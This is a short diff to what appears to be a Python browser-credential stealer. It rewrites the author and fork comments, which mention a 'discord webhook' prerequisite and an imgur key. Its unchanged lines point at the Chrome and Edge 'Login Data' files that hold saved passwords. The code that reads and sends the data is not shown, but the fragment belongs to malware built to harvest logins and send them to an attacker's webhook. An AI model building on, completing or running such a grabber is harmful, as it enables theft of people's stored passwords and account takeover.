@@ -19,15 +19,7 @@ import time
 from os import remove
 from sys import argv
 
-# prerequisites => discord webhook, imgur api key
-# lines to edit => 164, 166, 178  | replace: "placeholder"
-# author => lust, l-ust on github | https://www.github.com/l-ust
-# update "beam" by 2qk , 2qk on github (discontinued)
-# continued by "war" , w6r on github
-# deleted imgur and screenshot for perfomance boost
-# This is being updated and forked daily due to browser compability and etc
-# besure to keep at latest version for best performance
-# discontinued by war , lust and 2qk
+# last version 3/1/21 by msr#6536
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
